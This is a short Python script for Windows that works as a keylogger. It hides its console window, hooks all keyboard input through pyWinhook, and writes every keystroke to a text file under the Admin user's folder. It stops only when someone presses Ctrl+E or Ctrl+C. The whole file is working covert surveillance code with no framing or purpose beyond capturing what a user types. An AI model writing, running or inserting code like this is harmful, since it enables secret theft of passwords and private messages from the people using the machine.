import os
import win32api
import win32console
import win32gui
import pythoncom
import pyWinhook
import sys

win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)

output_file_path ='C:\\Users\Admin\output.txt'

def OnKeyboardEvent(event):
    if event.Ascii == 5:
        exit(1)
    if event.Ascii != 0 or event.Ascii != 8:
        # Open output.txt to read current keystrokes
        if os.path.exists(output_file_path):
            with open(output_file_path, 'r') as f:
                buffer = f.read()
        else:
            buffer = ''

        # Open output.txt to write current + new keystrokes
        with open(output_file_path, 'w') as f:
            keylogs = chr(event.Ascii)
            if event.Ascii == 13:
                keylogs = '\n'
            buffer += keylogs
            f.write(buffer)

    if event.Ascii == 3:  # Ctrl + C
        exit(1)

# Create a hook manager object
hm = pyWinhook.HookManager()
hm.KeyDown = OnKeyboardEvent

# Set the hook
hm.HookKeyboard()

# Start the message loop
pythoncom.PumpMessages()
